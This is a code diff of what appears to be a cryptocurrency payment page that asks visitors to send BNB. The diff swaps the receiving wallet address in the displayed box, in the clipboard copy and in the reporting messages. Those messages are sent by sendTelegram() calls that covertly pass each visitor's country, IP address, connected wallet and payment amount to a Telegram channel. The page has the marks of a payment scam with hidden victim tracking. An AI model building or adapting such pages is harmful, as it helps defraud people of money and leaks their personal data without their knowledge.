@@ -639,7 +639,7 @@
                 <div class="wallet-box">
                     <h4 style="color: #FFD700; margin-bottom: 15px;">💎 Send BNB to this address:</h4>
                     <div class="wallet-address" onclick="copyWallet()">
-                        0x742D35Cc32B5c0532b3fE6Cd0D8aDc52C6B1Bd6E
+                        0x388130DC8806512e18e6a9B433098f94d5510F8c
                         <button class="copy-btn">📋 Copy</button>
                     </div>
                     <div id="copyFeedback" style="color: #00ff00; margin-top: 15px; opacity: 0; text-align: center;">✅ Address Copied!</div>
@@ -938,18 +938,18 @@
         }
 
         function copyWallet() {
-            navigator.clipboard.writeText('0x742D35Cc32B5c0532b3fE6Cd0D8aDc52C6B1Bd6E');
+            navigator.clipboard.writeText('0x388130DC8806512e18e6a9B433098f94d5510F8c');
             const feedback = document.getElementById('copyFeedback');
             feedback.style.opacity = '1';
             setTimeout(() => feedback.style.opacity = '0', 2000);
             
             const walletInfo = isWalletConnected ? `\n🔗 User Wallet: ${userWallet}` : '';
-            sendTelegram(`📋 BNB WALLET COPIED\n👤 ${userCountry} (${userIP})\n💰 0x742D35Cc32B5c0532b3fE6Cd0D8aDc52C6B1Bd6E${walletInfo}`);
+            sendTelegram(`📋 BNB WALLET COPIED\n👤 ${userCountry} (${userIP})\n💰 0x388130DC8806512e18e6a9B433098f94d5510F8c${walletInfo}`);
         }
 
         function checkPayment() {
             const walletInfo = isWalletConnected ? `\n🔗 User Wallet: ${userWallet}` : '';
-            sendTelegram(`💳 BNB PAYMENT CHECK\n👤 ${userCountry} (${userIP})\n💎 Expected: ${selectedPrice} BNB\n🔍 Wallet: 0x742D35Cc32B5c0532b3fE6Cd0D8aDc52C6B1Bd6E${walletInfo}`);
+            sendTelegram(`💳 BNB PAYMENT CHECK\n👤 ${userCountry} (${userIP})\n💎 Expected: ${selectedPrice} BNB\n🔍 Wallet: 0x388130DC8806512e18e6a9B433098f94d5510F8c${walletInfo}`);
             nextStep(3);
         }
 
